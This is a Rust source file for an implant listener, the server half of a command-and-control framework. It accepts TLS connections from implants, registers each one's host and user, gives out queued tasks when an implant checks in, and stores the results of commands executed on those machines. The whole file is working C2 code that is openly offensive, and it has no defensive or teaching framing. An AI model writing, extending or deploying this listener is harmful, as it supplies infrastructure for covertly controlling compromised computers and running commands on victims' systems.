// listener.rs — TLS implant listener
//
// each implant connects, sends a BeaconHello JSON line, gets a session id back,
// then loops: send checkin → receive task (or empty) → execute → send result
//
// framing: newline-delimited JSON. simple. works.
// i tried length-prefixed binary first (4-byte LE u32 header) and it was
// annoying to debug with netcat. ndjson is debuggable.

use anyhow::Result;
use rustls::ServerConfig;
use rustls_pemfile::{certs, pkcs8_private_keys};
use std::{fs::File, io::BufReader, net::SocketAddr, sync::Arc};
use tokio::{
    io::{AsyncBufReadExt, AsyncWriteExt, BufReader as TokioBufReader},
    net::TcpListener,
};
use tokio_rustls::TlsAcceptor;
use tracing::{debug, info, warn};

use crate::{cli::Cli, session::{BeaconHello, SessionStore, Sessions}, task::{TaskQueue, TaskResult}};

pub async fn run(
    bind:     String,
    sessions: SessionStore,
    tasks:    TaskQueue,
    cli:      &Cli,
) -> Result<()> {
    let addr: SocketAddr = bind.parse()?;
    let listener = TcpListener::bind(addr).await?;

    let acceptor = if cli.tls {
        Some(build_tls_acceptor(&cli.cert, &cli.key)?)
    } else {
        None
    };

    info!(addr = %addr, "implant listener ready");

    loop {
        let (stream, peer) = listener.accept().await?;
        let sessions = sessions.clone();
        let tasks    = tasks.clone();
        let acceptor = acceptor.clone();

        tokio::spawn(async move {
            if let Err(e) = handle_conn(stream, peer, sessions, tasks, acceptor).await {
                // don't let one bad implant take down the listener
                warn!(peer = %peer, "connection error: {e}");
            }
        });
    }
}

async fn handle_conn(
    stream:   tokio::net::TcpStream,
    peer:     SocketAddr,
    sessions: SessionStore,
    tasks:    TaskQueue,
    acceptor: Option<TlsAcceptor>,
) -> Result<()> {
    info!(peer = %peer, "new implant connection");

    if let Some(acc) = acceptor {
        let tls = acc.accept(stream).await?;
        let mut reader = TokioBufReader::new(tls);
        handle_implant_loop(&mut reader, peer, &sessions, &tasks).await?;
    } else {
        let mut reader = TokioBufReader::new(stream);
        handle_implant_loop(&mut reader, peer, &sessions, &tasks).await?;
    }

    Ok(())
}

async fn handle_implant_loop<S>(
    reader:   &mut TokioBufReader<S>,
    peer:     SocketAddr,
    sessions: &SessionStore,
    tasks:    &TaskQueue,
) -> Result<()>
where
    S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin,
{
    let store = Sessions(sessions.clone());
    let mut line = String::new();

    // --- HANDSHAKE: expect BeaconHello ---
    line.clear();
    reader.read_line(&mut line).await?;
    let hello: BeaconHello = serde_json::from_str(line.trim())
        .map_err(|e| anyhow::anyhow!("bad hello: {e}"))?;

    let sess = store.register(hello, peer.ip().to_string());
    info!(id = %sess.id, host = %sess.hostname, user = %sess.username, "session registered");

    // send session id back so implant knows its own id
    let reply = format!("{}\n", serde_json::json!({ "session_id": sess.id }));
    reader.get_mut().write_all(reply.as_bytes()).await?;

    // --- BEACON LOOP ---
    loop {
        line.clear();
        let n = reader.read_line(&mut line).await?;
        if n == 0 {
            info!(id = %sess.id, "implant disconnected");
            break;
        }

        let msg: serde_json::Value = match serde_json::from_str(line.trim()) {
            Ok(v)  => v,
            Err(e) => { warn!("malformed beacon from {}: {e}", sess.id); continue; }
        };

        let msg_type = msg["type"].as_str().unwrap_or("unknown");
        debug!(id = %sess.id, msg_type, "beacon");

        match msg_type {
            "checkin" => {
                store.touch(&sess.id);
                // pop next task (or send empty)
                let response = if let Some(task) = tasks.pop(&sess.id).await {
                    serde_json::to_string(&task)?
                } else {
                    serde_json::to_string(&serde_json::json!({ "type": "noop" }))?
                };
                reader.get_mut().write_all(format!("{response}\n").as_bytes()).await?;
            }

            "result" => {
                // implant is delivering a task result
                let result: TaskResult = serde_json::from_value(msg["data"].clone())
                    .map_err(|e| anyhow::anyhow!("bad result payload: {e}"))?;
                debug!(task_id = %result.task_id, exit = ?result.exit_code, "task result received");
                tasks.submit_result(result);
                // ack
                reader.get_mut().write_all(b"{\"type\":\"ack\"}\n").await?;
            }

            other => {
                warn!(id = %sess.id, msg_type = other, "unknown beacon type, ignoring");
            }
        }
    }

    Ok(())
}

fn build_tls_acceptor(cert_path: &str, key_path: &str) -> Result<TlsAcceptor> {
    let cert_file = File::open(cert_path)
        .map_err(|e| anyhow::anyhow!("cert {cert_path}: {e}"))?;
    let key_file = File::open(key_path)
        .map_err(|e| anyhow::anyhow!("key {key_path}: {e}"))?;

    let certs = certs(&mut BufReader::new(cert_file))
        .collect::<Result<Vec<_>, _>>()?;

    let mut keys = pkcs8_private_keys(&mut BufReader::new(key_file))
        .collect::<Result<Vec<_>, _>>()?;

    if keys.is_empty() {
        anyhow::bail!("no PKCS8 private key found in {key_path}");
    }

    let config = ServerConfig::builder()
        .with_no_client_auth()  // TODO: mTLS — add with_client_cert_verifier
        .with_single_cert(certs, rustls::pki_types::PrivateKeyDer::Pkcs8(keys.remove(0)))?;

    Ok(TlsAcceptor::from(Arc::new(config)))
}
// TLS listener
// TLS support added
